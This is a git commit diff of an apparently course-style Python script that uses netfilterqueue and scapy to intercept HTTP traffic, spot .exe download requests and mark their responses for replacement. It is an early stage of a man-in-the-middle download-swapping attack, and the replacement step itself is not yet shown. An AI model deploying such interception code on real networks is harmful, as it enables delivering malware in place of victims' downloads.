8b79962632c5ca470f34016247a05fe423d9d7d5
DungeOnMster <rishabh98@gmail.com>
2020-11-04 02:38:48 -0500

    4 nov/2020

--- file_interceptor/replace_downloads.py
+++ file_interceptor/replace_downloads.py
@@ -3,11 +3,21 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR):
-
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                print(scapy_packet.show())
     packet.accept()
 
 
